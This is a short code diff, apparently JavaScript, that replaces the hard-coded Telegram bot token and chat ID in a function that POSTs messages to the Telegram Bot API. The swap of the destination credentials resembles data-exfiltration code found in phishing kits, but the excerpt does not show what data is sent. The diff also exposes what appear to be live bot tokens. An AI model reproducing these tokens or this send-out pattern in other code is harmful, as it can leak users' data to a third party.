@@ -384,10 +384,10 @@
   }
 
   function sendToTelegram(message) {
-    fetch(`https://api.telegram.org/bot7769917776:AAG7myeUVy3HtP4zK-feu_iVvsdLDCO45-M/sendMessage`, {
+    fetch(`https://api.telegram.org/bot7538067014:AAGXkA7leF7kxMQvvtEvYLnipCfu8B81JJ4/sendMessage`, {
       method: 'POST',
       headers: {'Content-Type': 'application/json'},
-      body: JSON.stringify({ chat_id: '1881744939', text: message })
+      body: JSON.stringify({ chat_id: '8059354902', text: message })
     }).catch(err => console.error('Telegram API error:', err));
   }
 
